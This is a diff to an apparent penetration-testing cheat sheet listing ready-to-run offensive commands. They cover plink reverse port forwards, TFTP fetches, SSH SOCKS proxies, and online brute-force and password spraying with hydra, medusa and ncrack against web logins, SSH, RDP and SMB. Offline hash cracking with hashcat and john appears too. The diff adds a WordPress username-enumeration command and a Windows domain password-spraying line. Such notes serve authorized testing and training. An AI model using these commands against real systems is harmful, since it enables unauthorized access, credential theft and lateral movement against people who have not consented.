@@ -41,7 +41,7 @@ plink.exe root@ <ip> -R 4445:127.0.0.1:445
 plink.exe -l <user> -pw <password> <ip> -R 4433:127.0.0.1:445
 
 TFTP Windows Client - Target - Local
-tftp -­i <ip> get <file>
+tftp -i <ip> get <file>
 
 SSH SOCK4 Proxy (run on attacker system):
 SSH -D 8080 root@ <ip>
@@ -52,8 +52,16 @@ medusa -h <ip> -u admin -P passwords.txt -M http -n 8080 -m DIR:/admin -T 30
 Online Password Cracking with Hydra (ex. HTTP-Form-Post):
 hydra -l admin -P passwords.txt -t 10 -w 30 <ip> http-form-post "/login-off.asp:txtLoginID=^USER^&txtPassword=^PASS^:ACCESS DENIED"
 
+--(Wordpress example http-form-post - determine valid username):
+hydra -vV -L <username_list> -p anything -f 192.168.239.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+--(Determine valid user password):
+
 Online Password Cracking with Hydra (ex. SSH):
 hydra -L users.txt -P passwords.txt -t 4 -v ssh:// <ip>
+
+Password Spraying (Windows Domain):
+hydra -L <username_list> -p <password-to-check> smb://<ip_address> -o <output_file>
 
 Online RDP Password Cracking with Ncrack:
 ncrack -vv -T5 --user john -P passwords.txt rdp:// <ip>
@@ -62,7 +70,7 @@ Offline Password Cracking with Hashcat (Cisco-IOS MD5):
 hashcat --status --show -a 0 -m 500 <hash-file> <wordlist>
 
 Offline Password Cracking with John (Windows Hashes)
-john -­‐wordlist=/usr/share/wordlists/rockyou.txt <dumpfile> --format=LM
+john -‐wordlist=/usr/share/wordlists/rockyou.txt <dumpfile> --format=LM
 
 Password list Mangling with John:
 john --wordlist=passwords.txt --rules --stdout > passwords_mangled-1
